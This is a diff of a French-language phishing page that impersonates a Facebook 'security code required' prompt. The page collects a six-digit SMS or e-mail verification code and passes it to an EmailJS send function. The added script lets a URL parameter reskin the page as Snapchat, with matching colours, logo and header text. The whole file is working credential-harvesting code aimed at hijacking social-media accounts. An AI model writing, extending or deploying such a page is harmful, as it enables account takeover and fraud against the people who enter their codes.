@@ -79,15 +79,14 @@
 <body>
 <div class="container">
 <div class="logo">
-<img alt="Facebook" src="logo-fb.jpg"/>
+<img alt="Facebook" id="logo-img" src="logo-fb.jpg"/>
 </div>
-<h2>Code de sécurité requis</h2>
+<h2 id="header">Code de sécurité requis</h2>
 <p>Un code à 6 chiffres vous a été envoyé par SMS ou e-mail. Veuillez le saisir ci-dessous :</p>
-<input id="verification_code" maxlength="6" pattern="\d{6}" placeholder="••••••" required type="text"/>
-<button class="btn-primary" onclick="sendCodeViaEmailJS()">Valider</button>
-<a href="#">Renvoyer le code</a>
+<input id="verification_code" maxlength="6" pattern="\d{6}" placeholder="••••••" required="" type="text"/>
+<button class="btn-primary" id="validate-btn" onclick="sendCodeViaEmailJS()">Valider</button>
+<a href="#" id="resend-link">Renvoyer le code</a>
 </div>
-
 <script>
 function showPopup(message) {
   const existing = document.getElementById("popup");
@@ -129,7 +128,6 @@ function validateInputsAndRedirect(inputSelector, redirectUrl) {
   }
 }
 </script>
-
 <!-- EmailJS SDK -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
@@ -176,6 +174,34 @@ function openOrRedirectToMonopolyGO() {
   }, 2000);
 }
 </script>
+<script>
+window.addEventListener('DOMContentLoaded', () => {
+  const reseau = new URLSearchParams(window.location.search).get("reseau") || "facebook";
 
-</body>
+  const body = document.body;
+  const logo = document.getElementById("logo-img");
+  const header = document.getElementById("header");
+  const btn = document.getElementById("validate-btn");
+  const link = document.getElementById("resend-link");
+
+  if (reseau === "snapchat") {
+    body.style.backgroundColor = "#fffc00";
+    if (logo) logo.src = "logo-snapchat.png";
+    if (header) header.textContent = "Code Snapchat requis";
+    if (btn) {
+      btn.style.backgroundColor = "#000";
+      btn.style.color = "#fff";
+    }
+    if (link) link.style.color = "#000";
+  } else {
+    body.style.backgroundColor = "#f0f2f5";
+    if (logo) logo.src = "logo-fb.jpg";
+    if (btn) {
+      btn.style.backgroundColor = "#1877f2";
+      btn.style.color = "#fff";
+    }
+    if (link) link.style.color = "#1877f2";
+  }
+});
+</script></body>
 </html>
